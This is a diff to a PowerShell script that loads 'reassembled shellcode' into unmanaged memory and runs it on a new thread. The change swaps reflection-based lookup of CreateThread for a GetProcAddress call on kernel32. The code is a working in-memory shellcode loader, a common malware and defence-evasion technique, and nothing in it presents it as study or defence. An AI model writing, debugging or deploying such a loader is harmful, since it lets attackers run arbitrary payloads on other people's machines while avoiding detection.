@@ -39,27 +39,29 @@ $address = [Runtime.InteropServices.Marshal]::AllocHGlobal($byteArray.Length)
 
 if ($address -ne [IntPtr]::Zero) {
     Write-Host "Reassembled Shellcode placed in RAM at: $address"
-    
-    # 1. Use the SAME surgical method that worked for VirtualAlloc
-    # In some versions of mscorlib, it is called 'CreateThread' or 'CreateRemoteThread'
-    $ctMethod = $native.GetMethod("CreateThread", [Reflection.BindingFlags]"Static, Public, NonPublic")
-    
-    # Check if we found it; if not, look for its 'Twin'
-    if (-not $ctMethod) { $ctMethod = $native.GetMethod("CreateRemoteThread", [Reflection.BindingFlags]"Static, Public, NonPublic") }
-    
-    $ctAddr = $ctMethod.MethodHandle.GetFunctionPointer()
+
+    # 1. Get GetProcAddress to find CreateThread
+    # We use the same method that worked for vAlloc to get GetProcAddress first
+    $gpaMethod = $native.GetMethod("GetProcAddress", [Reflection.BindingFlags]"Static, Public, NonPublic")
+    $gpaAddr = $gpaMethod.MethodHandle.GetFunctionPointer()
+    $gpaDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($gpaAddr, [Func[IntPtr, String, IntPtr]])
+
+    # 2. Use GetProcAddress to find CreateThread in the kernel32 handle we already have
+    $ctAddr = $gpaDelegate.Invoke($k32Handle, "CreateThread")
     Write-Host "Launcher found at: $ctAddr"
 
-    # 2. Create the "Launcher" Delegate
-    # We use the full [System.Func] path to avoid the "Overload" error
-    $ctDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
+    if ($ctAddr -ne [IntPtr]::Zero) {
+        # 3. Create the Launcher Delegate
+        $ctDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
 
-    # 3. Launch the Shellcode
-    Write-Host "Launching Thread..."
-    $ctDelegate.Invoke([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
-    
-    # 4. Keep PowerShell alive to see the result
-    Start-Sleep -Seconds 5
+        # 4. Launch!
+        Write-Host "Launching Thread..."
+        $ctDelegate.Invoke([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
+        
+        Start-Sleep -Seconds 5
+    } else {
+        Write-Error "Could not find CreateThread address."
+    }
 }
 
 # 6. Cleanup
